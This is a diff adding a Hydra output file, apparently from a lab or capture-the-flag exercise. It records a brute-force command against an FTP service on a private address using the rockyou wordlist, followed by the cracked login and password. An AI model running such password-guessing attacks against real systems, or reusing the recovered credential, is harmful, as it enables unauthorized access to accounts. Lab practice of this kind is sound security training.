@@ -1,0 +1,2 @@
+# Hydra v9.5 run at 2024-11-05 21:01:13 on 10.10.74.215 ftp (hydra -l chris -P /usr/share/wordlists/rockyou.txt -f -vV -o brute.txt ftp://10.10.74.215)
+[21][ftp] host: 10.10.74.215   login: chris   password: crystal
